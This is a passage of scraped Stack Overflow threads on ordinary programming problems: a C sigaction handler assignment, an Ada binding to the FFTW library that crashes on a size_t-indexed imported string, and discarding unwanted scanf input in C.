[{"tags": ["c", "linux", "signals", "handler", "sigaction"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1551917231, "post_id": 55034028, "comment_id": 96820688, "body": "Note:you cannot use <code>printf()</code> (and friends) from within a signal handler."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551919176, "post_id": 55034028, "comment_id": 96821134, "body": "You&#39;re missing a variable name in the <code>handler</code> function definition. Did you mean to write <code>siginfo_t *si</code>?"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user11157060"}, "edited": false, "score": 0, "creation_date": 1551920337, "post_id": 55034389, "comment_id": 96821380, "body": "I did that, now it says struct sigaction has no member named &quot;sa_action&quot;"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1551920512, "post_id": 55034389, "comment_id": 96821418, "body": "It&#39;s <code>sa_sigaction</code>, not <code>sa_action</code>."}], "tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": false, "score": 1, "last_activity_date": 1551919456, "creation_date": 1551919456, "answer_id": 55034389, "question_id": 55034028, "link": "https://stackoverflow.com/questions/55034028/how-to-fix-signal-handler-assignment/55034389#55034389", "title": "How to fix Signal Handler assignment", "body": "<p>You're assigning the handler function to the wrong member of <code>sig</code>. The declaration of <code>struct sigaction</code> is:</p>\n\n<pre><code>struct sigaction {\n    void     (*sa_handler)(int);\n    void     (*sa_sigaction)(int, siginfo_t *, void *);\n    sigset_t   sa_mask;\n    int        sa_flags;\n    void     (*sa_restorer)(void);\n};\n</code></pre>\n\n<p><code>sig.sa_handler</code> is a function with only one argument, the signal number. When you use the <code>SA_SIGINFO</code> flag, you need to assign the 3-argument function to <code>sig.sa_sigaction</code> instead.</p>\n\n<pre><code>int main(){\n    struct sigaction sig;\n    sig.sa_flags = SA_SIGINFO;\n    sigemptyset(&amp;sig.sa_mask);\n    sig.sa_sigaction = handler;\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user11157060"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 580, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1551919456, "creation_date": 1551916583, "last_edit_date": 1551919107, "question_id": 55034028, "link": "https://stackoverflow.com/questions/55034028/how-to-fix-signal-handler-assignment", "title": "How to fix Signal Handler assignment", "body": "<p>For Linux C programming, I have this handler and main method: </p>\n\n<pre><code>void handler(int number, signinfo_t, void *ignore){\n    printf(\"Signaling %d\\n\", si-&gt;si_pid);\n}\n\nint main(){\n    struct sigaction sig;\n    sig.sa_flags = SA_SIGINFO;\n    sigemptyset(&amp;sig.sa_mask);\n    sig.sa_handler = handler // This line has error \n</code></pre>\n\n<p>If I make the handler with just 1 parameter <code>void handler(int num)</code>\nit works fine; however, I will not be able to use <code>si-&gt;si_pid</code>. The warning I am getting is : </p>\n\n<pre><code> warning: assignment to __sighandler_t from an incompatible pointer type\n -Wincompatible-pointer-types\n sig.sa_handler = handler;\n</code></pre>\n\n<p>Do I make it <code>sig.sa_action</code> instead? I want to fix the warning</p>\n"}, {"tags": ["c", "ada", "fftw"], "answers": [{"comments": [{"owner": {"reputation": 22472, "user_id": 40851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RwWVj.jpg?s=128&g=1", "display_name": "Simon Wright", "link": "https://stackoverflow.com/users/40851/simon-wright"}, "edited": false, "score": 2, "creation_date": 1551947669, "post_id": 55033956, "comment_id": 96829555, "body": "No, this is imported; there is no corresponding object in the Ada source. It\u2019s going to be nul-terminated, so get contents by e.g. <code>To_Ada (fftw_version, Trim_Nul =&gt; True)</code> (which is the default)."}, {"owner": {"reputation": 61, "user_id": 11161629, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df2709b9c835e67b7d5f2e8a4e450ee8?s=128&d=identicon&r=PG&f=1", "display_name": "C. Bartels", "link": "https://stackoverflow.com/users/11161629/c-bartels"}, "edited": false, "score": 0, "creation_date": 1551975491, "post_id": 55033956, "comment_id": 96846879, "body": "I had originally left that part of the specification unchanged, so what I stated in the question was automatically generated by gcc from fftw3.h.  When I stepped through the result in gdb, it threw an exception at the line before the &#39;pragma Import&#39;, as if it was allocating space first, before importing the contents from C."}, {"owner": {"reputation": 2330, "user_id": 7237062, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/z4Nky.jpg?s=128&g=1", "display_name": "LoneWanderer", "link": "https://stackoverflow.com/users/7237062/lonewanderer"}, "edited": false, "score": 0, "creation_date": 1552244925, "post_id": 55033956, "comment_id": 96927268, "body": "Seeing the syntax <code>fftw_version : aliased char_array (size_t);</code> looked weird to me, I always feel that an actual range shall be declared. It surprises me that it could compile without an actual range or <code>size_t&#39;range</code>."}], "tags": [], "owner": {"reputation": 3266, "user_id": 6854407, "user_type": "registered", "profile_image": "https://graph.facebook.com/10205840043960722/picture?type=large", "display_name": "Jim Rogers", "link": "https://stackoverflow.com/users/6854407/jim-rogers"}, "is_accepted": false, "score": 3, "last_activity_date": 1551916029, "creation_date": 1551916029, "answer_id": 55033956, "question_id": 55033651, "link": "https://stackoverflow.com/questions/55033651/ada-program-calling-c-functions-has-problems-with-interfaces-c-size-t/55033956#55033956", "title": "Ada program calling c functions has problems with interfaces.c.size_t", "body": "<p>I do not think you understand the size of the array you are trying to create with</p>\n\n<pre><code>fftw_version : aliased char_array (size_t);  -- /usr/local/include/fftw3.h:457\n</code></pre>\n\n<p>This line does not simply state that the array fftw_version is indexed by the type size_t, it also specifies that the array indices span the range of 0..2**32, which apparently is too large for your hardware to handle.\nWhat array size do you really want here? For instance, if you want an array of 100 characters you should specify</p>\n\n<pre><code>fftw_version : aliased char_array(size_t range 0..99);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 61, "user_id": 11161629, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df2709b9c835e67b7d5f2e8a4e450ee8?s=128&d=identicon&r=PG&f=1", "display_name": "C. Bartels", "link": "https://stackoverflow.com/users/11161629/c-bartels"}, "edited": false, "score": 0, "creation_date": 1551918977, "post_id": 55033985, "comment_id": 96821085, "body": "Thanks for that info.  I will try to work it out as you suggest and post back here in a day or so.  As for the the location of fftw_version in fftw3.h, it is the result of a large macro (FFTW_DEFINE_API(X, R, C)) which gets expanded generate three versions of the entire API, one each for single, double, and long double precision.  So, &#39;FFTW_EXTERN const char X(version)[]&#39; gets expanded to &#39;extern const char fftw_version[]&#39; in C, and is converted as I described by the gcc -fdump-ada-spec command."}, {"owner": {"reputation": 22472, "user_id": 40851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RwWVj.jpg?s=128&g=1", "display_name": "Simon Wright", "link": "https://stackoverflow.com/users/40851/simon-wright"}, "edited": false, "score": 0, "creation_date": 1551955548, "post_id": 55033985, "comment_id": 96834570, "body": "But it\u2019s imported! There should be no space allocated in the Ada source file that does the importing, any more than in the C <code>extern const char fftw_version[]</code>."}, {"owner": {"reputation": 23530, "user_id": 347964, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/bE90m.png?s=128&g=1", "display_name": "flyx", "link": "https://stackoverflow.com/users/347964/flyx"}, "reply_to_user": {"reputation": 22472, "user_id": 40851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RwWVj.jpg?s=128&g=1", "display_name": "Simon Wright", "link": "https://stackoverflow.com/users/40851/simon-wright"}, "edited": false, "score": 0, "creation_date": 1551962038, "post_id": 55033985, "comment_id": 96838492, "body": "@SimonWright You&#39;re right. Declaration and error message seemed to make it obvious what happens that I didn&#39;t properly think about it. Perhaps the compiler still includes the check leading to the Storage_Error even though the variable is imported?"}], "tags": [], "owner": {"reputation": 23530, "user_id": 347964, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/bE90m.png?s=128&g=1", "display_name": "flyx", "link": "https://stackoverflow.com/users/347964/flyx"}, "is_accepted": false, "score": 3, "last_activity_date": 1551916224, "creation_date": 1551916224, "answer_id": 55033985, "question_id": 55033651, "link": "https://stackoverflow.com/questions/55033651/ada-program-calling-c-functions-has-problems-with-interfaces-c-size-t/55033985#55033985", "title": "Ada program calling c functions has problems with interfaces.c.size_t", "body": "<p>To quote <a href=\"http://www.ada-auth.org/standards/12rm/html/RM-B-3.html#p43\" rel=\"nofollow noreferrer\">the LRM</a>:</p>\n\n<blockquote>\n  <p>The types int, short, long, unsigned, ptrdiff_t, size_t, double, char, wchar_t, char16_t, and char32_t correspond respectively to the C types having the same names. </p>\n</blockquote>\n\n<p>Regardless of how the actual definition looks like, you can trust the compiler to comply to the LRM, so Ada's <code>size_t</code> will, in fact, have the exact same size as C's.</p>\n\n<p>That being said, your error stems from the fact that you get a stack overflow when allocating <code>size_t'Last</code> bytes for the array. I searched the <code>fftw3.h</code> header for a definition of <code>fftw_version</code> which you're trying to wrap, but I couldn't find any, so for a more detailed answer, you need to show the code you're wrapping. Most probably you want to use <code>chars_ptr</code> instead from <a href=\"http://www.ada-auth.org/standards/12rm/html/RM-B-3-1.html\" rel=\"nofollow noreferrer\">Interfaces.C.Strings</a> to wrap strings from C \u2013 its conversion methods take care of getting the string length by searching for the null terminator.</p>\n"}, {"tags": [], "owner": {"reputation": 22472, "user_id": 40851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RwWVj.jpg?s=128&g=1", "display_name": "Simon Wright", "link": "https://stackoverflow.com/users/40851/simon-wright"}, "is_accepted": false, "score": 3, "last_activity_date": 1551955108, "creation_date": 1551955108, "answer_id": 55041745, "question_id": 55033651, "link": "https://stackoverflow.com/questions/55033651/ada-program-calling-c-functions-has-problems-with-interfaces-c-size-t/55041745#55041745", "title": "Ada program calling c functions has problems with interfaces.c.size_t", "body": "<p>Seems to me it\u2019s likely to be what you\u2019re doing with it. This isn\u2019t a <a href=\"https://stackoverflow.com/help/MCVE\">Minimal, Complete and Verifiable Example</a>, because it works for me :-)</p>\n\n<p>bartels.adb:</p>\n\n<pre><code>with Ada.Text_IO; use Ada.Text_IO;\nwith Interfaces.C; use Interfaces.C;\nprocedure Bartels is\n   fftw_version : aliased char_array (size_t);  -- /usr/local/include/fftw3.h:457\n   pragma Import (C, fftw_version, \"fftw_version\");\n   V : constant String := To_Ada (fftw_version, Trim_Nul =&gt; True);\nbegin\n   Put_Line (V);\nend Bartels;\n</code></pre>\n\n<p>bartels_c.c:</p>\n\n<pre><code>const char fftw_version[] = \"the version\";\n</code></pre>\n\n<p>Compile the C file, build the Ada with</p>\n\n<pre><code>$ gnatmake bartels.adb -largs bartels_c.o\n</code></pre>\n\n<p>and run</p>\n\n<pre><code>$ ./bartels \nthe version\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 61, "user_id": 11161629, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df2709b9c835e67b7d5f2e8a4e450ee8?s=128&d=identicon&r=PG&f=1", "display_name": "C. Bartels", "link": "https://stackoverflow.com/users/11161629/c-bartels"}, "is_accepted": false, "score": 4, "last_activity_date": 1551975638, "last_edit_date": 1551975638, "creation_date": 1551974742, "answer_id": 55048145, "question_id": 55033651, "link": "https://stackoverflow.com/questions/55033651/ada-program-calling-c-functions-has-problems-with-interfaces-c-size-t/55048145#55048145", "title": "Ada program calling c functions has problems with interfaces.c.size_t", "body": "<p>Thank you everybody.  Simon's answer really helped.  One problem is that fftw_version[] is set in the C code for fftw, not by me, and I cannot guarantee that the procedure will be called before something in the fftw library needs it (fftw3_h.ads is elaborated before any of my code).  I also found an old FFTW_Ada binding online from 2004 by Stephen J. Sangwine.  While I could not get his code to work, I combined how he dealt with the version string with Simon's suggestion and created a function that returns the string when needed by something else in the fftw library.</p>\n\n<pre><code>function FFTW_Version return String is\n    tmp_version : aliased char_array(size_t) ;\n    pragma Import(C, tmp_version, \"fftw_version\");\n begin\n    return To_Ada(tmp_version, Trim_Nul =&gt; True) ;\n end FFTW_Version;\n</code></pre>\n\n<p>This gives me something that produces the string when needed, but does not make assumptions about the size of the string (which the FFTW_Ada code did).  This compiles and works nicely.  </p>\n"}, {"tags": [], "owner": {"reputation": 196035, "user_id": 230513, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/632732029bf05854c17d0dea6c82dcb4?s=128&d=identicon&r=PG", "display_name": "trashgod", "link": "https://stackoverflow.com/users/230513/trashgod"}, "is_accepted": false, "score": 1, "last_activity_date": 1552346372, "last_edit_date": 1552346372, "creation_date": 1552345701, "answer_id": 55111711, "question_id": 55033651, "link": "https://stackoverflow.com/questions/55033651/ada-program-calling-c-functions-has-problems-with-interfaces-c-size-t/55111711#55111711", "title": "Ada program calling c functions has problems with interfaces.c.size_t", "body": "<p>Summarizing several helpful answers, @Jim Rogers points out <a href=\"https://stackoverflow.com/a/55033956/230513\">here</a> that the elaboration of an object of <code>size_t</code> might exceed available memory. @Simon Wright observes <a href=\"https://stackoverflow.com/a/55041745/230513\">here</a> and illustrates <a href=\"https://www.adaic.org/resources/add_content/standards/12rm/html/RM-B-1.html#p38\" rel=\"nofollow noreferrer\">here</a> that no space need be allocated for an imported object. Indeed, the <a href=\"https://www.adaic.org/resources/add_content/standards/12rm/html/RM-B-1.html#p38\" rel=\"nofollow noreferrer\"><code>Import</code></a> aspect, implied by the corresponding <a href=\"https://www.adaic.org/resources/add_content/standards/12rm/html/RM-J-15-5.html\" rel=\"nofollow noreferrer\"><em>pragma</em></a>, specifies the following dynamic semantics:</p>\n\n<blockquote>\n  <p>Notwithstanding what this International Standard says elsewhere, the elaboration of a declaration with a True Import aspect does not create the entity. Such an elaboration has no other effect than to allow the defining name to denote the external entity. </p>\n</blockquote>\n\n<p>The following complete example, illustrates the aspect corresponding to the pragma shown <a href=\"https://stackoverflow.com/a/55048145/230513\">here</a> in the <code>function</code> by @C. Bartels:</p>\n\n<p>console:</p>\n\n<pre><code>$ gprclean -q ; gprbuild -q &amp;&amp; ./bartels \nVersioni 1.2.3\n</code></pre>\n\n<p>bartels.gpr:</p>\n\n<pre><code>project Bartels is\n\n   for Languages use (\"Ada\", \"C\");\n   for Main use (\"bartels.adb\");\n\nend Bartels;\n</code></pre>\n\n<p>bartels.adb:</p>\n\n<pre><code>with Ada.Text_IO;\nwith Interfaces.C;\n\nprocedure Bartels is\n\n   function Get_Version return String is\n      version : Interfaces.C.char_array(Interfaces.C.size_t)\n         with Import =&gt; True, Convention =&gt; C;\n   begin\n      return Interfaces.C.To_Ada(version, Trim_Nul =&gt; True) ;\n   end Get_Version;\n\n begin\n   Ada.Text_IO.Put_Line (Get_Version);\nend Bartels;\n</code></pre>\n\n<p>version.c:</p>\n\n<pre><code>const char version[] = \"Versioni 1.2.3\";\n</code></pre>\n\n<p>As an aside, some confusion may have arisen as this example works with <code>GNAT Community 2018</code> but fails with <code>GNAT GPL 2017</code>:</p>\n\n<pre><code>$ gprclean -q ; gprbuild -q &amp;&amp; ./bartels \nraised STORAGE_ERROR : bartels.adb:7 object too large\n</code></pre>\n"}], "owner": {"reputation": 61, "user_id": 11161629, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df2709b9c835e67b7d5f2e8a4e450ee8?s=128&d=identicon&r=PG&f=1", "display_name": "C. Bartels", "link": "https://stackoverflow.com/users/11161629/c-bartels"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 327, "favorite_count": 0, "answer_count": 5, "score": 2, "last_activity_date": 1552346372, "creation_date": 1551913892, "last_edit_date": 1551915715, "question_id": 55033651, "link": "https://stackoverflow.com/questions/55033651/ada-program-calling-c-functions-has-problems-with-interfaces-c-size-t", "title": "Ada program calling c functions has problems with interfaces.c.size_t", "body": "<p>I have been working on an Ada project and need to interface with a C library (fftw3).  I used the command</p>\n\n<pre><code>gcc -c -fdump-ada-spec -C /usr/local/include/fftw3.h\n</code></pre>\n\n<p>to generate a preliminary binding (some tweaking required).  I was able to get my code and the fftw3_h.ads to compile in gnat.  However, the program crashes with</p>\n\n<pre><code>raised STORAGE_ERROR : fftw3_h.ads:733 object too large\n</code></pre>\n\n<p>When I run it through gdb, the code is crashing on a line that defines a version string,</p>\n\n<pre><code>fftw_version : aliased char_array (size_t);  -- /usr/local/include/fftw3.h:457\npragma Import (C, fftw_version, \"fftw_version\");\n</code></pre>\n\n<p>My understanding of this is that Ada is trying to allocate space for the entire string all at once and is basing the storage space on the range of size_t.  However, size_t in this case comes from interfaces.c.size_t which is defined as </p>\n\n<pre><code>type size_t is mod 2 ** System.Parameters.ptr_bits;\n</code></pre>\n\n<p>in i-c.ads while for C, size_t is defined as unsigned long in stddef.h.  I am not sure how big 2**ptr_bits is, but I don't see any reason why the definition of size_t in i-c.ads should be expected to be limited to the size of C's unsigned long.  If it is longer than C's unsigned long, then I suspect that the code is trying to create an array that uses more memory than I have.  I have tried to just use interfaces.c.unsigned_long instead of size_t, but Ada does not like the type mismatch (which I should have know).</p>\n\n<p>At this point, I have two questions.  Firstly, is my understanding of the problem close (this is my first experience with interfacing to between Ada and C).</p>\n\n<p>Secondly, assuming my understanding is correct, is there a way around the problem or do I need to take a completely different approach?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 0, "creation_date": 1551914522, "post_id": 55033648, "comment_id": 96820008, "body": "No, there&#39;s no <i>function</i> that can read your mind and know what parts of that you want to use and what you want to ignore. You&#39;ll have to write the code to do that yourself. Compilers have gotten pretty smart, but there are none yet that are telepathic. FWIW, the usual way to write your <code>while</code> would be <code>while (circles &lt; number_of_iterations)</code> - it&#39;s much easier to read and understand."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1551916000, "post_id": 55033648, "comment_id": 96820374, "body": "That terminal output doesn&#39;t come from the code you&#39;ve posted, since the code you&#39;ve posted doesn&#39;t output anything. Please post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 0, "creation_date": 1551916087, "post_id": 55033648, "comment_id": 96820398, "body": "edited with full code"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551919848, "post_id": 55033648, "comment_id": 96821287, "body": "regarding: <code>unsigned int chr[number_of_iterations][8];</code>  since this is declaring an array of <code>int</code>, that trailing <code>8</code> is 8 integers, not 8 characters.  I.E. each line of the array is &#39;8 * sizeof( int )&#39; bytes wide"}, {"owner": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 0, "creation_date": 1551919941, "post_id": 55033648, "comment_id": 96821304, "body": "I am going to change it to char dont worry about that, the problem I care about, is that I want to parse and then throw away input"}], "answers": [{"comments": [{"owner": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 0, "creation_date": 1551916906, "post_id": 55034044, "comment_id": 96820611, "body": "thank you for your answer, may I ask what should be inside of that while ? -thank you"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 0, "creation_date": 1551916993, "post_id": 55034044, "comment_id": 96820630, "body": "@StyleZ In the <code>while</code> loop, do <code>;</code> which is nothing.  Code will continue reading until <code>&#39;\\n&#39;</code> or <code>EOF</code>."}, {"owner": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 0, "creation_date": 1551917266, "post_id": 55034044, "comment_id": 96820695, "body": "I am really sorry but I have got an error trying to compile it ( i am new at it :D ) so this is really a dumb question, but still i ve got this error and I have no clue what to do with it : main.c:9:44: error: expected identifier     while ((ch = fgetc(stdin)) != &#39;\\n&#39;) &amp;&amp; (ch != EOF)) {                                            ^ ( its pointing on ( ch ..."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 1, "creation_date": 1551917423, "post_id": 55034044, "comment_id": 96820738, "body": "Tip: Avoid &quot;I have no clue&quot;.  Rather than exaggerate and say what you cannot do, state what you can do and have observed."}, {"owner": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 0, "creation_date": 1551917731, "post_id": 55034044, "comment_id": 96820830, "body": "also one more thing error ( i have assumed that it will be raised, but i am not sure what to parse there / hwo to hande it ) -&gt; <code>undeclared label &#39;ch&#39;</code>"}, {"owner": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 0, "creation_date": 1551917883, "post_id": 55034044, "comment_id": 96820863, "body": "nope, you have it there, but you have it just inicialised as an int, you dont pass it to the function or anything"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 0, "creation_date": 1551917966, "post_id": 55034044, "comment_id": 96820877, "body": "Sorry, your unposted code is unclear - take some time to work it out."}, {"owner": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "edited": false, "score": 0, "creation_date": 1551918065, "post_id": 55034044, "comment_id": 96820898, "body": "I am gonna put down edited version of the whole code :) to make it look more clear"}, {"owner": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551918157, "post_id": 55034044, "comment_id": 96820917, "body": "Let us <a href=\"https://chat.stackoverflow.com/rooms/189562/discussion-between-stylez-and-chux\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 3, "last_activity_date": 1551918428, "last_edit_date": 1551918428, "creation_date": 1551916715, "answer_id": 55034044, "question_id": 55033648, "link": "https://stackoverflow.com/questions/55033648/how-to-take-and-at-a-same-time-dumb-an-unwanted-input-scanf/55034044#55034044", "title": "How to take and at a same time dumb an unwanted input? (scanf)", "body": "<blockquote>\n  <p>I would like to read the whole input and then ignore the rest.</p>\n</blockquote>\n\n<p>Do not use <code>scanf()</code>, but do all user input with <code>fgets()</code> and then use <code>sscanf(), strtol()</code>, etc to parse.</p>\n\n<p>If obliged to stay with <code>scanf()</code>, test its return value and consume the rest of the line.</p>\n\n<pre><code>int consume_line(void) {\n  int ch;\n  while ((ch = fgetc(stdin)) != '\\n'  &amp;&amp; ch != EOF) {\n    ;\n  }\n  return ch;\n}\n\n\n....\nswitch (scanf(\"%d\", &amp;number_of_iterations)) {\n   case 1: consume_line(); break;\n   case 0: consume_line(); /* Decide if code should re-try reading, etc. */ break;\n   case EOF: // Decide what to do if End-Of-File or rare Low-Level-Input-Error occurred.\n}\n</code></pre>\n"}], "owner": {"reputation": 762, "user_id": 9559884, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joDJA.png?s=128&g=1", "display_name": "StyleZ", "link": "https://stackoverflow.com/users/9559884/stylez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 117, "favorite_count": 0, "accepted_answer_id": 55034044, "answer_count": 1, "score": 1, "last_activity_date": 1551962445, "creation_date": 1551913865, "last_edit_date": 1551918138, "question_id": 55033648, "link": "https://stackoverflow.com/questions/55033648/how-to-take-and-at-a-same-time-dumb-an-unwanted-input-scanf", "title": "How to take and at a same time dumb an unwanted input? (scanf)", "body": "<p>I have came across a little problem while I am playing around with <code>scanf</code> ... to be more specific, I would like to read the whole input and then ignore the rest. let me show you what do i mean:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    int number_of_iterations = 1;\n    int circles = 0;\n\n    scanf(\"%d\", &amp;number_of_iterations);\n    unsigned int chr[number_of_iterations][8];\n\n    while (number_of_iterations &gt; circles) {\n        scanf(\"%x\", chr[circles]);\n        circles++;\n    }\n\n    int circles2 = 0;\n    while (circles2 &lt; circles){\n        printf(\"%x \\n\", chr[circles2]);\n        circles2++;\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>This will take an X number of inputs, but if i put in input something like this:</p>\n\n<pre><code>1 1CAAC\n\n      28    EAAEB5\n  F489AD95\n  CAAC\n\n   28    EAAEB5\nF489AD95 F489AD95 EAAEB5\nF489AD95 F489AD95\n</code></pre>\n\n<p>input will take <code>1 1CAAC</code> but i want the rest to read but throw away... is there any function to do so ?</p>\n\n<pre><code>Dominiks-MacBook-Pro-2:testing stylez$ ./a.out\n1 1CAAC\n\n      28    EAAEB5\n  F489AD95\n  CAAC\n\n   28    EAAEB5\nF489AD95 F489AD95 EAAEB5\nF489AD95 F489AD95e30ca8c0Dominiks-MacBook-Pro-2:testing stylez$ \nDominiks-MacBook-Pro-2:testing stylez$       28    EAAEB5\nbash: 28: command not found\nDominiks-MacBook-Pro-2:testing stylez$   F489AD95\nbash: F489AD95: command not found\nDominiks-MacBook-Pro-2:testing stylez$   CAAC\nbash: CAAC: command not found\nDominiks-MacBook-Pro-2:testing stylez$ \nDominiks-MacBook-Pro-2:testing stylez$    28    EAAEB5\nbash: 28: command not found\nDominiks-MacBook-Pro-2:testing stylez$ F489AD95 F489AD95 EAAEB5\nbash: F489AD95: command not found\n</code></pre>\n\n<hr>\n\n<p><strong><em>Edited code from one ansser ( testing the code to understand how does it work )</em></strong> </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint consume_line(void) {\n    int ch;\n    while ((ch = fgetc(stdin)) != '\\n') &amp;&amp; ch != EOF) {\n        ;\n    }\n    return ch;\n}\n\nint main(void)\n{\n    int number_of_iterations = 1;\n    int circles = 0;\n\n  